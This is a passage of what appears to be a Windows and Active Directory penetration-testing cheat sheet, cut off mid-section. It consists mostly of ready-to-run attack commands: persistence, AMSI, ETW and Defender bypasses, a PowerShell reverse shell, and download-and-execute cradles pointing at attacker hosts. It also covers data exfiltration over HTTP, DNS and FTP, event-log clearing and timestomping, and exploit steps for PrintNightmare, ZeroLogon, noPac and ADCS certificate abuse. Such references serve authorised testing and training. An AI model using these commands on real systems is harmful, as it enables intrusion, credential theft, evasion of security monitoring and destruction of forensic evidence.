sc create "Updater" binpath= "C:\Temp\payload.exe" start= auto
sc start "Updater"

:: Modify existing service (if writable)
sc config "VulnService" binpath= "C:\Temp\payload.exe"
```

### WMI Event Subscriptions

```powershell
# Create WMI persistence (survives reboots)
$filterName = "Updater"
$consumerName = "Updater"
$payload = "C:\Temp\payload.exe"

$wmiParams = @{
    Namespace = "root\subscription"
    ErrorAction = "Stop"
}

$filter = Set-WmiInstance @wmiParams -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance @wmiParams -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $payload
}

Set-WmiInstance @wmiParams -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### Startup Folder

```cmd
:: Current user
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"

:: All users (requires admin)
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

### DLL Hijacking

```cmd
:: Common hijackable DLLs in PATH
:: Check for missing DLLs with Process Monitor

:: Write DLL to writable PATH directory
copy malicious.dll "C:\Python27\dll_name.dll"

:: Phantom DLL hijacking (non-existent DLLs)
:: Common targets: wlbsctrl.dll, wbemcomn.dll, etc.
```

---

## 10. AMSI & ETW Bypasses

### AMSI Bypasses

```powershell
# Reflection method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Matt Graeber's bypass
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Patching AmsiScanBuffer (requires memory write)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

```cmd
:: Base64 encoded bypass execution
powershell -ep bypass -e <base64-encoded-bypass>

:: Downgrade to PowerShell 2.0 (no AMSI)
powershell -version 2 -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

### ETW Bypass

```powershell
# Patch EtwEventWrite
$patch = [Byte[]](0xc3)  # ret instruction
$ntdll = [Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.UnsafeNativeMethods').GetType('Microsoft.Win32.UnsafeNativeMethods')
$etwAddr = $ntdll.GetMethod('GetProcAddress', [Reflection.BindingFlags]'NonPublic,Static', $null, [Type[]]@([IntPtr], [String]), $null).Invoke($null, @([Runtime.InteropServices.Marshal]::GetHINSTANCE([ntdll].Module), 'EtwEventWrite'))

$oldProtect = 0
$ntdll::VirtualProtect($etwAddr, [UInt32]$patch.Length, 0x40, [Ref]$oldProtect)
[Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, $patch.Length)
```

---

## 11. Useful One-Liners

### Quick Wins

```powershell
# Find passwords in files
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|passwd" -List

# Find files modified in last 24 hours
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}

# List installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion

# Check for stored WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# List all listening ports with process
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).Name}}

# Find writable directories in PATH
$env:PATH.Split(';') | ForEach-Object { if (Test-Path $_) { $acl = Get-Acl $_; if ($acl.AccessToString -match "Everyone|Users|Authenticated Users") { $_ } } }

# Quick domain enumeration
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Check for Defender exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Reverse Shell One-Liners

```powershell
# PowerShell reverse shell
$c=New-Object Net.Sockets.TCPClient('<attacker>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

# Encoded execution
powershell -ep bypass -e <base64-encoded-payload>

# Download cradle
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/shell.ps1')"
```

---

## 12. Pivoting & Port Forwarding

### Native Windows Port Forwarding (netsh)

```cmd
:: Add port forward (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.10

:: List all port forwards
netsh interface portproxy show all

:: Remove port forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

:: Reset all port forwards
netsh interface portproxy reset
```

### SSH Tunneling (Windows 10+)

```cmd
:: Local port forward (access remote:3389 via localhost:13389)
ssh -L 13389:192.168.1.10:3389 user@jumphost

:: Remote port forward (expose local:445 on remote:8445)
ssh -R 8445:127.0.0.1:445 user@attacker-server

:: Dynamic SOCKS proxy
ssh -D 9050 user@jumphost

:: Background tunnel
ssh -f -N -L 13389:192.168.1.10:3389 user@jumphost
```

### Chisel

```cmd
:: Attacker (server)
chisel server -p 8080 --reverse

:: Victim - Reverse SOCKS proxy
chisel client <attacker>:8080 R:socks

:: Victim - Forward specific port
chisel client <attacker>:8080 R:3389:192.168.1.10:3389

:: Victim - Multiple forwards
chisel client <attacker>:8080 R:3389:192.168.1.10:3389 R:445:192.168.1.10:445
```

### Ligolo-ng

```cmd
:: Attacker - Start proxy server
ligolo-proxy -selfcert

:: Victim - Connect agent
ligolo-agent -connect <attacker>:11601 -ignore-cert

:: In proxy interface:
:: session - select agent
:: ifconfig - view routes
:: start - start tunnel

:: Add route on attacker
sudo ip route add 192.168.1.0/24 dev ligolo
```

### Plink (PuTTY CLI)

```cmd
:: Local port forward
plink.exe -ssh -L 13389:192.168.1.10:3389 user@jumphost -pw <password>

:: Remote port forward
plink.exe -ssh -R 8445:127.0.0.1:445 user@attacker -pw <password>

:: Dynamic SOCKS proxy
plink.exe -ssh -D 9050 user@jumphost -pw <password>

:: Non-interactive (accept host key)
echo y | plink.exe -ssh -L 13389:192.168.1.10:3389 user@jumphost -pw <password>
```

### SOCKS Proxy Usage

```cmd
:: Proxychains (Linux attacker)
proxychains nmap -sT -Pn 192.168.1.10
proxychains impacket-psexec domain/user:pass@192.168.1.10

:: Windows - Configure system proxy
netsh winhttp set proxy proxy-server="socks=127.0.0.1:9050" bypass-list="*.local"

:: Reset proxy
netsh winhttp reset proxy
```

### Meterpreter Pivoting

```bash
# Add route through session
meterpreter > run autoroute -s 192.168.1.0/24

# Port forward
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.10

# SOCKS proxy
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 9050
msf > run
```

---

## 13. Living off the Land Binaries (LOLBins)

### Execution

| Binary | Command | Description |
|---|---|---|
| `mshta` | `mshta http://<attacker>/payload.hta` | Execute HTA file |
| `mshta` | `mshta vbscript:Execute("...")` | Execute VBScript |
| `rundll32` | `rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write('<script src=http://attacker/payload.js></script>')` | Execute JS |
| `regsvr32` | `regsvr32 /s /n /u /i:http://<attacker>/file.sct scrobj.dll` | Execute SCT file |
| `certutil` | `certutil -urlcache -split -f http://<attacker>/payload.exe C:\Temp\payload.exe && C:\Temp\payload.exe` | Download & execute |
| `cscript/wscript` | `cscript //nologo C:\Temp\payload.vbs` | Execute VBS/JS |
| `msiexec` | `msiexec /q /i http://<attacker>/payload.msi` | Install remote MSI |
| `forfiles` | `forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Temp\payload.exe"` | Execute via forfiles |
| `pcalua` | `pcalua -a C:\Temp\payload.exe` | Program Compatibility Assistant |

### Download

```cmd
:: Certutil
certutil -urlcache -split -f http://<attacker>/file.exe C:\Temp\file.exe

:: Bitsadmin
bitsadmin /transfer job /download /priority high http://<attacker>/file.exe C:\Temp\file.exe

:: Expand
expand \\<attacker>\share\file.zip C:\Temp\file.exe

:: Esentutl
esentutl.exe /y \\<attacker>\share\file.exe /d C:\Temp\file.exe /o

:: Findstr (read SMB)
findstr /V "randomstring" \\<attacker>\share\file.exe > C:\Temp\file.exe

:: Desktopimgdownldr
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://<attacker>/file.exe /eventName:desktopimgdownldr
```

### Execution via DLL Side-Loading

```cmd
:: Rundll32 with export function
rundll32.exe payload.dll,DllMain
rundll32.exe payload.dll,#1

:: Regsvr32
regsvr32 /s payload.dll

:: Control panel execution
control.exe payload.dll

:: MSIExec DLL
msiexec /y payload.dll
```

### Bypass AppLocker / Application Whitelisting

```cmd
:: MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

:: InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

:: RegAsm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll

:: RegSvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll

:: CMSTP
cmstp.exe /ni /s payload.inf

:: Msdeploy
msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="C:\Temp\payload.exe"
```

### Compilation on Target

```cmd
:: C# compilation with csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload.cs

:: VBC compilation
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe /out:payload.exe payload.vb

:: JScript compilation
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe payload.js
```

---

## 14. Constrained Language Mode Bypass

### Detection

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Constrained = ConstrainedLanguage
# Full = FullLanguage
```

### Bypass Techniques

```powershell
# PowerShell v2 downgrade (if available, no CLM)
powershell -version 2

# PSByPassCLM (inject into unmanaged runspace)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PSBypassCLM.exe

# Custom runspace via C#
# Compile and execute C# that creates unrestricted runspace
```

```cmd
:: Via MSBuild (inline C# task)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe bypass.xml

:: bypass.xml content allows full PowerShell execution
```

### PowerShell without PowerShell.exe

```cmd
:: SyncAppvPublishingServer
SyncAppvPublishingServer.exe "n; IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"

:: Via rundll32
rundll32.exe PowerShdll.dll,main

:: PowerLessShell (MSBuild-based)
MSBuild.exe PowerLessShell.xml

:: NoPowerShell (C# implementation)
NoPowerShell.exe Get-Process
```

---

## 15. Windows Defender Evasion

### Exclusion Abuse

```powershell
# Add exclusions (requires admin)
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".ps1"

# View current exclusions
Get-MpPreference | Select Exclusion*

# Common pre-existing exclusions to check
Get-MpPreference | Select ExclusionPath,ExclusionProcess,ExclusionExtension
```

### Disable Protections (Requires Admin)

```powershell
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable IOAV (scanning downloaded files)
Set-MpPreference -DisableIOAVProtection $true

# Disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Disable script scanning
Set-MpPreference -DisableScriptScanning $true

# Disable all via registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1

# Disable via GPO registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Payload Obfuscation

```powershell
# String obfuscation
$a = "Invoke"
$b = "-Mimikatz"
& ($a + $b)

# Character array
$cmd = [char[]]@(73,69,88) -join ''  # IEX

# Base64 + compression
$code = [Convert]::ToBase64String([IO.Compression.DeflateStream]::new([IO.MemoryStream][Convert]::FromBase64String($compressed), [IO.Compression.CompressionMode]::Decompress).ToArray())

# Invoke-Obfuscation techniques
# Token obfuscation
& (("IEX" -split '' | %{[char][int]$_}) -join '')

# String reversal
$reversed = ")'x]1[tnemnorvinE:vne$teleD'(xeI"
IEX ($reversed[-1..-($reversed.Length)] -join '')
```

### In-Memory Execution

```powershell
# .NET assembly in memory
$bytes = (New-Object Net.WebClient).DownloadData("http://attacker/payload.exe")
$assembly = [Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @(,[string[]]@()))

# PowerShell script in memory
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")

# Reflective DLL injection
$bytes = (New-Object Net.WebClient).DownloadData("http://attacker/payload.dll")
Invoke-ReflectivePEInjection -PEBytes $bytes
```

---

## 16. Data Exfiltration

### File Compression

```cmd
:: Zip using PowerShell
powershell Compress-Archive -Path C:\Data -DestinationPath C:\Temp\data.zip

:: Zip with password (7zip)
7z.exe a -pPassword123 C:\Temp\data.7z C:\Data\*

:: Makecab (native compression)
makecab C:\Data\secret.txt C:\Temp\secret.cab
```

```powershell
# Compress folder
Compress-Archive -Path "C:\Sensitive" -DestinationPath "C:\Temp\exfil.zip"

# Compress specific files
Compress-Archive -Path "C:\Data\*.docx","C:\Data\*.xlsx" -DestinationPath "C:\Temp\docs.zip"
```

### Exfiltration Channels

```powershell
# HTTP POST
$data = Get-Content C:\Temp\data.zip -Encoding Byte
Invoke-WebRequest -Uri "http://attacker/upload" -Method POST -Body $data

# Base64 via HTTP
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\data.zip"))
Invoke-WebRequest -Uri "http://attacker/exfil?data=$b64" -Method GET

# DNS exfiltration (slow, stealthy)
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\data.txt"))
$chunks = $data -split '(.{63})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName "$chunk.attacker.com" -Type TXT -ErrorAction SilentlyContinue
}
```

```cmd
:: SMB to attacker share
copy C:\Temp\data.zip \\<attacker>\share\data.zip

:: FTP upload
echo open <attacker> > ftp.txt
echo user anonymous >> ftp.txt
echo pass anonymous >> ftp.txt
echo binary >> ftp.txt
echo put C:\Temp\data.zip >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt

:: TFTP (if enabled)
tftp -i <attacker> PUT C:\Temp\data.zip

:: Certutil encode + copy
certutil -encode C:\Temp\data.zip C:\Temp\data.b64
type C:\Temp\data.b64 | clip
```

### Cloud Storage

```powershell
# Upload to Azure Blob
$context = New-AzStorageContext -StorageAccountName "account" -StorageAccountKey "key"
Set-AzStorageBlobContent -File "C:\Temp\data.zip" -Container "exfil" -Blob "data.zip" -Context $context

# AWS S3 (if CLI available)
aws s3 cp C:\Temp\data.zip s3://bucket/data.zip
```

---

## 17. Cleanup & Anti-Forensics

### Event Log Clearing

```cmd
:: Clear all logs (requires admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

:: Clear via PowerShell
for /F "tokens=*" %a in ('wevtutil el') DO wevtutil cl "%a"
```

```powershell
# Clear all event logs
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }

# Clear specific logs
Clear-EventLog -LogName Security,System,Application

# Wevtutil PowerShell
wevtutil el | Foreach-Object { wevtutil cl "$_" }
```

### Timestomping

```powershell
# Modify timestamps
$file = Get-Item C:\Temp\payload.exe
$date = Get-Date "01/01/2020 12:00:00"
$file.CreationTime = $date
$file.LastWriteTime = $date
$file.LastAccessTime = $date

# Copy timestamps from another file
$source = Get-Item C:\Windows\System32\notepad.exe
$target = Get-Item C:\Temp\payload.exe
$target.CreationTime = $source.CreationTime
$target.LastWriteTime = $source.LastWriteTime
$target.LastAccessTime = $source.LastAccessTime
```

### File Deletion

```cmd
:: Secure delete (overwrite)
cipher /w:C:\Temp

:: Delete with SDelete (Sysinternals)
sdelete.exe -p 3 C:\Temp\payload.exe

:: PowerShell removal
Remove-Item C:\Temp\payload.exe -Force

:: Delete alternate data streams
dir /r C:\Temp
more < C:\Temp\file.txt:hidden
powershell -c "Remove-Item C:\Temp\file.txt -Stream hidden"
```

### Registry Cleanup

```cmd
:: Remove Run key persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f

:: Remove service
sc delete "MaliciousService"

:: Clear PowerShell history
del %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath

# Clear recent files
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force

# Clear temp files
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
```

### Disable Logging

```powershell
# Disable PowerShell Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 0

# Disable Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name EnableModuleLogging -Value 0

# Disable Transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name EnableTranscripting -Value 0
```

---

## 18. Common CVE Exploits

### PrintNightmare (CVE-2021-34527)

```powershell
# Check if vulnerable
Get-Service -Name Spooler

# CVE-2021-1675 / CVE-2021-34527
# Requires: Print Spooler running, attacker hosts malicious DLL

# Remote exploitation
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DriverName "Xerox" -NewUser "hacker" -NewPassword "Password123!"

# SharpPrintNightmare
SharpPrintNightmare.exe C:\Temp\payload.dll
SharpPrintNightmare.exe \\<attacker>\share\payload.dll \\<target>
```

### ZeroLogon (CVE-2020-1472)

```bash
# Test vulnerability
impacket-zerologon <dc-name> <dc-ip>

# Exploit (sets DC password to empty)
impacket-zerologon <dc-name> <dc-ip> -exploit

# Dump hashes with empty password
impacket-secretsdump -no-pass -just-dc <domain>/<dc-name>\$@<dc-ip>

# Restore DC password
impacket-restorepassword <domain>/<dc-name>@<dc-name> -target-ip <dc-ip> -hexpass <original-hex>
```

### PetitPotam (CVE-2021-36942)

```bash
# Coerce authentication from DC to attacker
python3 PetitPotam.py <attacker-ip> <dc-ip>

# Capture with Responder or ntlmrelayx
ntlmrelayx.py -t ldaps://<dc-ip> --delegate-access

# Combine with ADCS relay (ESC8)
ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### HiveNightmare/SeriousSAM (CVE-2021-36934)

```cmd
:: Check if vulnerable (VSS enabled + accessible SAM)
icacls C:\Windows\System32\config\SAM

:: If readable by BUILTIN\Users, system is vulnerable
:: Copy from shadow copy
vssadmin list shadows

:: Extract from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY
```

### noPac (CVE-2021-42278/CVE-2021-42287)

```bash
# Scan for vulnerability
noPac.py scan <domain>/<username>:<password> -dc-ip <dc-ip>

# Exploit - get shell on DC
noPac.py exploit <domain>/<username>:<password> -dc-ip <dc-ip> -shell

# Dump hashes
noPac.py exploit <domain>/<username>:<password> -dc-ip <dc-ip> -dump
```

### Certifried (CVE-2022-26923)

```bash
# Requires ADCS with vulnerable template
# Create machine account
impacket-addcomputer <domain>/<user>:<pass> -computer-name 'EVIL$' -computer-pass 'Password123!'

# Change dNSHostName to DC
python3 bloodyAD.py -d <domain> -u <user> -p <pass> --host <dc-ip> set object 'CN=EVIL,CN=Computers,DC=domain,DC=local' dNSHostName '["dc.domain.local"]'

# Request certificate
certipy req -u 'EVIL$@domain.local' -p 'Password123!' -ca 'CA-Name' -target '<ca-server>' -template 'Machine'

# Authenticate with certificate
certipy auth -pfx evil.pfx -dc-ip <dc-ip>
```

---

## 19. Quick Reference Tables

### Common Ports

| Port | Service | Attack Vector |
|---|---|---|
| 21 | FTP | Anonymous login, credential brute force |
| 22 | SSH | Credential brute force, key reuse |
| 23 | Telnet | Cleartext credentials |
| 25 | SMTP | Open relay, user enumeration |
| 53 | DNS | Zone transfer, DNS poisoning |
| 80/443 | HTTP/S | Web application attacks |
| 88 | Kerberos | AS-REP roast, Kerberoast |
| 135 | RPC | WMI execution, RPC enumeration |
| 139/445 | SMB | PsExec, relay attacks, eternal blue |
| 389/636 | LDAP | AD enumeration, credential extraction |
| 1433 | MSSQL | xp_cmdshell, credential brute force |
| 3268/3269 | Global Catalog | AD enumeration |
| 3389 | RDP | BlueKeep, credential attacks |
| 5985/5986 | WinRM | PowerShell remoting |
| 5432 | PostgreSQL | Credential attacks, RCE |
| 6379 | Redis | Unauthenticated access |
| 27017 | MongoDB | Unauthenticated access |

### Hash Formats

| Type | Format | Example |
|---|---|---|
| LM | `aad3b435b51404ee` | Legacy, empty = no LM |
| NTLM | `a87f3a337d73085c45f9416be5787d86` | Modern Windows |
| NetNTLMv1 | `user::domain:LMResp:NTResp:challenge` | Network capture |
| NetNTLMv2 | `user::domain:challenge:NTProof:NTResp` | Network capture |
| Kerberos TGS | `$krb5tgs$23$*user$domain$spn*$hash...` | Kerberoast |
| Kerberos AS-REP | `$krb5asrep$23$user@domain:hash...` | AS-REP roast |
| DCC2/mscash2 | `$DCC2$10240#user#hash` | Cached domain creds |

### Hashcat Modes

| Mode | Hash Type |
|---|---|
| 1000 | NTLM |
| 3000 | LM |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS-REP (RC4) |
| 18200 | Kerberos AS-REP (RC4) |
| 19600 | Kerberos TGS-REP (AES256) |
| 19700 | Kerberos AS-REP (AES256) |
| 2100 | DCC2/mscash2 |

```bash
# Crack NTLM
hashcat -m 1000 hash.txt rockyou.txt

# Crack Kerberoast
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# Crack AS-REP Roast
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## 20. Tool Quick Reference

### Impacket Suite

| Tool | Purpose |
|---|---|
| `impacket-psexec` | Remote command execution via SMB |
| `impacket-wmiexec` | Remote command execution via WMI |
| `impacket-smbexec` | Remote command execution via SMB |
| `impacket-atexec` | Remote command via scheduled task |
| `impacket-dcomexec` | Remote command via DCOM |
| `impacket-secretsdump` | Extract credentials/hashes |
| `impacket-GetUserSPNs` | Kerberoasting |
| `impacket-GetNPUsers` | AS-REP roasting |
| `impacket-ntlmrelayx` | NTLM relay attacks |
| `impacket-smbclient` | SMB client operations |
| `impacket-lookupsid` | SID enumeration |
| `impacket-reg` | Remote registry operations |

### Mimikatz Modules

| Module | Purpose |
|---|---|
| `sekurlsa::logonpasswords` | Dump plaintext creds from LSASS |
| `sekurlsa::pth` | Pass-the-Hash |
| `sekurlsa::tickets` | Export Kerberos tickets |
| `lsadump::sam` | Dump SAM database |
| `lsadump::dcsync` | DCSync attack |
| `lsadump::lsa /patch` | Dump LSA secrets |
| `kerberos::golden` | Create Golden Ticket |
| `kerberos::ptt` | Pass-the-Ticket |
| `vault::cred` | Dump Credential Manager |
| `dpapi::cred` | Decrypt DPAPI blobs |
| `token::elevate` | Impersonate SYSTEM token |

### Rubeus Commands

| Command | Purpose |
|---|---|
| `Rubeus.exe asktgt` | Request TGT |
| `Rubeus.exe asktgs` | Request TGS |
| `Rubeus.exe kerberoast` | Kerberoasting |
| `Rubeus.exe asreproast` | AS-REP roasting |
| `Rubeus.exe s4u` | S4U constrained delegation |
| `Rubeus.exe ptt` | Pass-the-Ticket |
| `Rubeus.exe dump` | Dump tickets from memory |
| `Rubeus.exe triage` | List tickets |
| `Rubeus.exe harvest` | Harvest tickets periodically |
| `Rubeus.exe monitor` | Monitor for logons |

---

## 21. Active Directory Certificate Services (ADCS) Attacks

### Enumeration

```powershell
# Find CA servers
certutil -config - -ping

# List templates
certutil -TCAInfo

# Enumerate templates and permissions
Certify.exe find
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser

# Certipy enumeration
certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip>
certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -vulnerable -stdout
```

### ESC1 - Misconfigured Certificate Templates

```bash
# Template allows SAN (Subject Alternative Name) specification
# Low-priv user can request cert for any user

# Request cert as Domain Admin
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template <vuln-template> -upn administrator@<domain>

# Authenticate with cert
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

```cmd
:: Certify
Certify.exe request /ca:<ca-server>\<ca-name> /template:<vuln-template> /altname:administrator
```

### ESC2 - Any Purpose Templates

```bash
# Template has "Any Purpose" EKU or no EKU
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template <vuln-template>
```

### ESC3 - Enrollment Agent Templates

```bash
# Step 1: Request Enrollment Agent cert
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template <enrollment-agent-template>

# Step 2: Use EA cert to request cert on behalf of another user
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template User -on-behalf-of '<domain>\administrator' -pfx <enrollment-agent.pfx>
```

### ESC4 - Vulnerable Template ACL

```bash
# Modify template to make it vulnerable (ESC1)
certipy template -u <user>@<domain> -p <password> -template <template-name> -save-old

# Request certificate
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template <template-name> -upn administrator@<domain>

# Restore original template
certipy template -u <user>@<domain> -p <password> -template <template-name> -configuration <old-config.json>
```

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
# Any template can specify SAN

certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template User -upn administrator@<domain>
```

### ESC7 - Vulnerable CA ACL

```bash
# User has ManageCA or ManageCertificates rights

# Add officer permission
certipy ca -ca <ca-name> -add-officer <user> -u <user>@<domain> -p <password>

# Enable SubjectAltRequireUpn
certipy ca -ca <ca-name> -enable-template SubCA -u <user>@<domain> -p <password>

# Request failed SubCA cert and issue it
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -template SubCA -upn administrator@<domain>
certipy ca -ca <ca-name> -issue-request <request-id> -u <user>@<domain> -p <password>
certipy req -u <user>@<domain> -p <password> -ca <ca-name> -target <ca-server> -retrieve <request-id>
```

### ESC8 - NTLM Relay to HTTP Enrollment

```bash
# CA has HTTP enrollment enabled without EPA

# Start relay
ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template <template>

# Coerce authentication (e.g., PetitPotam)
python3 PetitPotam.py <attacker-ip> <dc-ip>

# Use captured certificate
certipy auth -pfx <dc>.pfx -dc-ip <dc-ip>
```

### Certificate Authentication

```bash
# Authenticate using PFX
certipy auth -pfx cert.pfx -dc-ip <dc-ip>

# Pass-the-Cert with Rubeus
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfx-password> /ptt

# Extract NTLM hash from certificate
certipy auth -pfx cert.pfx -dc-ip <dc-ip> -ldap-shell
```

---

## 22. Delegation Attacks

### Unconstrained Delegation

```powershell
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# PowerView
Get-DomainComputer -Unconstrained | Select DnsHostName

# SharpView
SharpView.exe Get-DomainComputer -Unconstrained
```

```cmd
:: Monitor for incoming tickets on compromised unconstrained system
Rubeus.exe monitor /interval:5 /nowrap

:: Coerce DC to authenticate (SpoolSample/PrinterBug)
SpoolSample.exe <dc> <unconstrained-host>

:: Extract TGT and use
Rubeus.exe ptt /ticket:<base64-ticket>
```

### Constrained Delegation

```powershell
# Find users/computers with constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# PowerView
Get-DomainUser -TrustedToAuth | Select SamAccountName,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select DnsHostName,msds-allowedtodelegateto
```

```cmd
:: S4U attack with Rubeus (have password/hash of constrained delegation account)
:: Request TGT
Rubeus.exe asktgt /user:<delegation-user> /rc4:<hash> /outfile:tgt.kirbi

:: S4U2Self + S4U2Proxy
